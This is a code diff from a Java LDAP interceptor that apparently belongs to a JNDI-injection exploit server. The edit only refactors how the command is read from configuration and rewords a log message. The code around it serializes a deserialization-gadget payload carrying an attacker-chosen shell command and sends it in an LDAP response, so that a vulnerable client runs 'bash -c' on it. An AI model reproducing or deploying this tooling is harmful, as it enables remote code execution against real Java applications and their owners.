@@ -23,12 +23,12 @@ public class RSOperationInterceptor implements LDAPInterceptor {
     public void sendResult(Entry entry, InMemoryInterceptedSearchResult result) throws Exception {
         GContext context = new GContext();
         ObjectPayload op = context.getGadget(this.gadget);
-        String command = Config.command;
+        String command = Config.getGlobalInstance().command;
         entry.addAttribute("javaClassName", "foo");
 
         byte[] data = CommonUtil.serialize(op.getObjectPayload(command));
         entry.addAttribute("javaSerializedData", data);
-        System.out.printf("[LDAP] send serialized data directly >> use %s execute command [bash -c '%s']\n", this.gadget, command);
+        System.out.printf("[LDAP] send serialized data directly >> use %s execute to command [bash -c '%s']\n", this.gadget, command);
 
         result.sendSearchEntry(entry);
         result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
